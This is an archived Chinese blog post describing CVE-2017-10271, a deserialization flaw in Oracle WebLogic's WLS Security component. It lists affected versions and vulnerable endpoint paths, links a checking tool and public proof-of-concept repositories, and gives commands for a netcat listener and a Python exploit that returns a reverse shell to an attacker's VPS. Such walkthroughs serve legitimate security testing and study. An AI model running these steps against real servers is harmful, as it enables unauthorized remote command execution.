# CVE-2017-10271 XMLDecoder 反序列化 - Null1433 - 博客园

> 原文：[`www.cnblogs.com/null1433/p/12677519.html`](https://www.cnblogs.com/null1433/p/12677519.html)

漏洞描述：WebLogic 的 WLS Security 组件对外提供 webservice 服务,其中使用了 XMLDecoder 来解析用户传入的 XML 数据,在解析的过程中出现反序列化漏洞，可以构造请求对运行 WebLogic 中间件的主机进行攻击，执行任意命令

受影响 WebLogic 版本：

10.3.6.0.0

12.1.3.0.0

12.2.1.1.0

12.2.1.2.0

漏洞检测工具

[`pan.baidu.com/s/1bpg3ppl`](https://pan.baidu.com/s/1bpg3ppl)

![](img/e0a904b10390ad645aa812e8b52a75d1.png)

手工验证

漏洞点在/wls-wsat/CoordinatorPortType，访问 http://192.168.37.136:7001/wls-wsat/CoordinatorPortType

/_async/AsyncResponseService/wls-wsat/CoordinatorPortType/wls-wsat/CoordinatorPortType11/wls-wsat/ParticipantPortType/wls-wsat/ParticipantPortType111/wls-wsat/RegistrationPortTypeRPC/wls-wsat/RegistrationPortTypeRPC11/wls-wsat/RegistrationRequesterPortType/wls-wsat/RegistrationRequesterPortType11

出现如下图则证明存在该漏洞；

![](img/943982b19ff4d291bb99819e30dba074.png)

POC 可参考

[`github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961`](https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961)

[`github.com/RealBearcat/Oracle-WebLogic-CVE-2017-10271`](https://github.com/RealBearcat/Oracle-WebLogic-CVE-2017-10271)

利用 python 脚本

[`github.com/kkirsche/CVE-2017-10271`](https://github.com/kkirsche/CVE-2017-10271)

监听端口

nc -lvnp 8888

python 运行

python CVE-2017-10271.py -l vpsip -p 8888 -r http://目标 ip:7001

![](img/267a5dcbb9d2b9a150c44791cf626809.png)

 成功返回 shell

![](img/68f724bad5a33d9a9f6bd2ca7369ecb7.png)